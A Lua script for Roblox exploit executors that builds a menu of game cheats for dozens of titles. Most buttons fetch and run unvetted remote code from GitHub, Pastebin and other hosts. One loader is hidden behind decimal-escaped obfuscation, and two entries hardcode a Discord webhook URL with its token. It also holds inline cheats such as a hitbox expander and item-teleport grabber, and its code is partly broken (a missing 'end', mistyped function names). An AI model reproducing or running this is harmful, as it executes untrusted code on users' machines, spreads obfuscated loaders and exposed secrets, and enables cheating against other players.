-- start
local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

--windows
local scriptswin = DiscordLib:Window("SyrHub: Remastered v1.1.7b")

-- servers
local mainserv = scriptswin:Server("Syr Scripts", "cool")
local secserv = scriptswin:Server("Tool Scripts & Misc", "")

-- channels
local slbtns = mainserv:Channel("Shindo Life")
local bfbtns = mainserv:Channel("Blox Fruits")
local psxbtns = mainserv:Channel("Pet Simulator X")
local mm2btns = mainserv:Channel("Murder Mystery 2")
local rebtns = mainserv:Channel("Ragdoll Engine")
local bwbtns = mainserv:Channel("Bed Wars")
local swbtns = mainserv:Channel("Sky Wars by Voxels")
local sw2btns = mainserv:Channel("Sky Wars")
local bhbtns = mainserv:Channel("Brook Heaven")
local tohbtns = mainserv:Channel("Tower Of Hell")
local dhbtns = mainserv:Channel("Da Hood")
local hsebtns = mainserv:Channel("Hide and Seek Extreme")
local ybabtns = mainserv:Channel("Your Bizzare Adventure")
local lsbtns = mainserv:Channel("Lifting Simulator")
local ysxbtns = mainserv:Channel("Youtube Simulator X")
local ksagbtns = mainserv:Channel("Kill to Save Anime Girl")
local ims2btns = mainserv:Channel("Iron Man Simulator 2")
local klbtns = mainserv:Channel("King Legacy")
local evadebtns = mainserv:Channel("Evade")
local doorsbtns = mainserv:Channel("Doors")
local ambtns = mainserv:Channel("Adopt Me")
local arsbtns = mainserv:Channel("Arsenal")
local ffbtns = mainserv:Channel("Funky Friday")
local katbtns = mainserv:Channel("K.A.T")
local ktybtns = mainserv:Channel("Kitty")
local bssbtns = mainserv:Channel("Be Swarm Simulator")
local fafbtns = mainserv:Channel("Find the Floppa")
local pgybtns = mainserv:Channel("Piggy")
local rfbtns = mainserv:Channel("Rainbow Friends")
local ntbtns = mainserv:Channel("Ninja Tycoon")
local tsgbtns = mainserv:Channel("The Survival Game")
local tprrbtns = mainserv:Channel("The Pizzeria Roleplay Remastered")
local rt2btns = mainserv:Channel("Restaurant Tycoon 2")
local mrtbtns = mainserv:Channel("My Restaurant Tycoon")

--channels for tools
local miscbtns = secserv:Channel("Misc Scripts")

--scripts
bfbtns:Button("Mukuro Hub BF", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/OldBf"))()
end)

bfbtns:Button("HoHo Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
end)

bfbtns:Button("Zaque Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mei2232/ZaqueHub/main/Zaque%20Hub"))()
end)

slbtns:Button("Premier Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()
end)

slbtns:Button("V.G Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
end)

slbtns:Button("Project Meow", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ZOT/Project-PJM/main/shinido"))()
end)

slbtns:Button("Black Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xzqecc/Script/main/xzqec_changer"))()
end)

slbtns:Button("Wumpus Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dontsteal/donttouch/main/wump"))()
end)

slbtns:Button("Speed Hub X (best)", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Script%20Game"))()
end)

psxbtns:Button("Milk Up Pet Sim X", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/PetSimX/main/MilkUpBeta.lua"))()
end)

psxbtns:Button("Evo V4 Pet Sim X", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/PetSimulator/main/EvoV4.lua"))()
end)

psxbtns:Button("Huge Games Pet Sim X", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/Project/main/Huge%20Games.lua"))()
end)

psxbtns:Button("Hard Games Hub", function()
UserName = "Wizard_CatWhite"
WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
end)

psxbtns:Button("Comet Farm (Rejoin to turn off)", function()
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS" tooloadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2023/main/COMETFARM"))()  
end)

mm2btns:Button("Grey Hub", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel'),true))()
end)

mm2btns:Button("Purple Hub", function()
loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

mm2btns:Button("Black Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
end)

rebtns:Button("Ragdoll Engine Troll Hub", function()
loadstring(game:HttpGet("https://pastebin.com/raw/PB8ER7j3"))()
end)

rebtns:Button("Black GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua"))()
end)

bwbtns:Button("VapeV4", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

bwbtns:Button("NightBed Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/NightbedForRoblox/main/MainScript.lua", true))()
end)

swbtns:Button("Sky Wars by Voxels Vape V4", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

sw2btns:Button("Sky Wars Hub", function()
loadstring(Game:HttpGet("https://raw.githubusercontent.com/RedWirePlatinumTwo/RobloxScripts/main/SkywarsScript.lua"))()
end)

sw2btns:Button("SyrPro: Skywars", function()
loadstring(Game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/SyrProSkyWars/main/skywarsgui.lua"))()
end)

sw2btns:Button("Green GUI", function()
loadstring(game:HttpGet("https://paste.ee/r/r9gnA", true))()
end)

bhbtns:Button("Brook Heaven Troll GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy%20gui.lua"))()
end)

bhbtns:Button("Ice Hub Brook Heaven", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)

tohbtns:Button("Tower Of Hell OP Script", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub', true))()
end)

tohbtns:Button("Tower of Hell Oasis Hub", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/bruvzz/oasishub/main/script"))()
end)

tohbtns:Button("Darkrai X hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/scripts/main/TOH", true))()
end)

dhbtns:Button("Vertical Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/niqu1337/vertical/main/core/script.lua'))()
end)

dhbtns:Button("Mango Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub"))()
end)

dhbtns:Button("Swag Mode (OP)", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
end)

hsebtns:Button("Hide and Seek Extreme OP GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/HideAndSeekExtreme.lua"))()
end)

hsebtns:Button("Frakki GUI", function()
loadstring(game:HttpGet("https://pastebin.com/raw/HAgidzUN"))()
end)

hsebtns:Button("OneProtocol HnS Extreme", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OneProtocol/Project/main/Loader", true))()
end)

ybabtns:Button("Your Bizzare Adventure Autofarm + more", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/v3.lua"))()
end)

ybabtns:Button("YBA script 2", function()
_G.Options = {
    ["ToggleKey"] = "Delete",
}
loadstring(game:HttpGet(("https://raw.githubusercontent.com/VoidGaster/Scripts/main/" .. tostring(game.PlaceId)),true))()
end)

lsbtns:Button("Yellow GUI", function()
loadstring(game:HttpGet("https://pastebin.com/raw/zQ9zFW0f"  ,true))()
end)

lsbtns:Button("Blue GUI", function()
loadstring(game:HttpGetAsync('https://rentry.co/46649/raw'))()
end)

ysxbtns:Button("Autofarm GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/23"))()
end)

ksagbtns:Button("OP GUI Autofarm + more", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PerfectusMim/OXYGEN-HUB-/main/hub"))()
end)

ims2btns:Button("Iron Man Simulator 2 Op Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Robobo2022/Fun/main/ironman2.lua", true))() 
end)

klbtns:Button("Autofarm, Grab Fruits + more!", function()
local request = (syn and syn.request) or (http and http.request) or http_request
loadstring(request({["Url"]='https://x7.software',["Method"]='GET'}).Body)("X7-a5KsoQGw")
end)

klbtns:Button("BlackTrap Hub", function()
loadstring(game:HttpGetAsync("https://blacktrap.org/blacktrap/users/checkpoint/Auth.txt"))()

evadebtns:Button("Evade Script OP", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/9Strew/roblox/main/gamescripts/evade.lua"))()
end)

doorsbtns:Button("Doors Black GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Doors"))()
end)

doorsbtns:Button("Doors Green GUI", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/zoophiliaphobic/POOPDOORS/main/script.lua'))()
end)

doorsbtns:Button("Never Lose HUB", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/neverlose.xyz/main/Doors.lua"))()
end)

ambtns:Button("Adopt Me Autofarm", function()
loadstring(game:HttpGet("https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua"))()
end)

arsbtns:Button("Arsenal OP GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/HonestlyDex/DexHub/main/Init"))()
end)

arsbtns:Button("Hitbox Expander script", function()
function getplrsname()
for i,v in pairs(game:GetChildren()) do
if v.ClassName == "Players" then
return v.Name
end
end
end
local players = getplrsname()
local plr = game[players].LocalPlayer
coroutine.resume(coroutine.create(function()
while  wait(1) do
coroutine.resume(coroutine.create(function()
for _,v in pairs(game[players]:GetPlayers()) do
if v.Name ~= plr.Name and v.Character then
v.Character.RightUpperLeg.CanCollide = false
v.Character.RightUpperLeg.Transparency = 10
v.Character.RightUpperLeg.Size = Vector3.new(13,13,13)

v.Character.LeftUpperLeg.CanCollide = false
v.Character.LeftUpperLeg.Transparency = 10
v.Character.LeftUpperLeg.Size = Vector3.new(13,13,13)

v.Character.HeadHB.CanCollide = false
v.Character.HeadHB.Transparency = 10
v.Character.HeadHB.Size = Vector3.new(13,13,13)

v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = 10
v.Character.HumanoidRootPart.Size = Vector3.new(13,13,13)

end
end
end))
end
end))
end)

ffbtns:Button("Funky Friday Autoplayer (Flxuxs Exclusive)", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
end)


katbtns:Button("Kat OP Hub Aim, Autokill etc", function()
loadstring(game:HttpGet("https://pastebin.com/raw/6rd91GZx", true))()
end)

katbtns:Button("JNHH Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Kat12/main/Kat"))()
end)

katbtns:Button("Kattoware Hub", function()
loadstring(game:HttpGet('http://cattoware.tk/main.lua'))()
end)

ktybtns:Button("Kitty Black GUI (trash)", function()
loadstring(game:HttpGet("https://pastebin.com/raw/MwXkxRam"))()
end)

ktybtns:Button("Kitty Grey GUI (trash v2)", function()
loadstring(game:HttpGet("https://pastebin.com/raw/Z0DPwpNh"))()
end)

ktybtns:Button("Kitty OP GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkolymYT/Scriptss/master/KittyGUI.lua"))()
end)

bssbtns:Button("Altsego Hub", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/BeeSwarmSimulator.lua')))()
end)

bssbtns:Button("Kometa Hub", function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/283f3b821c3b385f66824b98a6cca600.lua"))()
end)

fafbtns:Button("Get all Floppas", function()
for i,v in ipairs(workspace.Floppas:GetChildren()) do
   firetouchinterest(v, game.Players.LocalPlayer.Character.PrimaryPart, 0)
end
end)

fafbtns:Button("Purple Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Schervi/FloppaHub/main/FloppaHubMain.lua"))()
end)

pgybtns:Button("Piggy item giver OP", function()
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.StarterGui
 
local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.CoreGui
 
local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
 
local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
UIGridLayout.CellSize = UDim2.new(0,90,0,90)
 
while wait(1) do
local a = workspace:getDescendants()
local items = {}
local itemframes = ScrollingFrame:getChildren()
for i=1,#itemframes do
if itemframes[i].ClassName == "TextButton" then
itemframes[i]:remove()
end
end
for i=1,#a do
if a[i].Name == "ItemPickupScript" and a[i].Parent:findFirstChild("ClickDetector") then
table.insert(items, a[i].Parent)
end
end
for i=1,#items do
local ItemFrame = Instance.new("TextButton", ScrollingFrame)
ItemFrame.Name = "ItemFrame"
ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ItemFrame.BackgroundTransparency = 0.95
ItemFrame.Size = UDim2.new(0, 100, 0, 100)
ItemFrame.Text = ""
local View = Instance.new("ViewportFrame", ItemFrame)
View.Name = "View"
View.Size = UDim2.new(1,0,1,0)
View.BackgroundTransparency = 1
View.BorderSizePixel = 0
local object = items[i]
local viewportclone = object:Clone()
viewportclone.Parent = View
local cam = Instance.new("Camera", viewportclone)
cam.CameraType = Enum.CameraType.Fixed
local objectPosition = object.Position
local cameraPosition = objectPosition + Vector3.new(0,3,0)
cam.CoordinateFrame = CFrame.new(cameraPosition, objectPosition)
View.CurrentCamera = cam
 
ItemFrame.MouseButton1Down:connect(function()
if items[i]:findFirstChild("ClickDetector") then
local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.05)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = items[i].CFrame
wait(0.1)
fireclickdetector(items[i].ClickDetector)
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end
end)
end
end
end)

rfbtns:Button("TweedLeak Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TweedLeak/Scripts/main/Rainbow-Friends.lua"))()
end)

rfbtns:Button("BorkWare", function()
loadstring(game:HttpsGet("https://raw.githubusercontent.com/CorruptedClan/BorkHub/main/script.lua"))()
end)

ntbtns:Button("Black Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AliCode14/scripts/main/ninjatycoon.lua"))()
end)

ntbtns:Button("Black GUI 2", function()
loadstring(game:HttpGet"https://thedragonslayer2.github.io")()
end)

tsgbtns:Button("Survival GUI", function()
loadstring(game:HttpGet("https://github.com/joeengo/exploiting/blob/main/tsg.lua?raw=true", true))()
end)

tprrbtns:Button("Tape Farm", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/TPRR/main/tapefarm.lua", true))()
end)

rt2btns:Button("One Protocol Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OneProtocol/Project/main/Loader", true))() 
end)

mrtbtns:Button("Random Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OneProtocol/Project/main/Loader", true))() 
end)

--tools
miscbtns:Button("Mobile Keyboard", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)

miscbtns:Button("Fly GUI Mobile", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)

miscbtns:Button("Anti AFK Script", function()
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
end)

miscbtns:Button("Infinite Yield Script", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

miscbtns:Button("Infinite Jump", function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)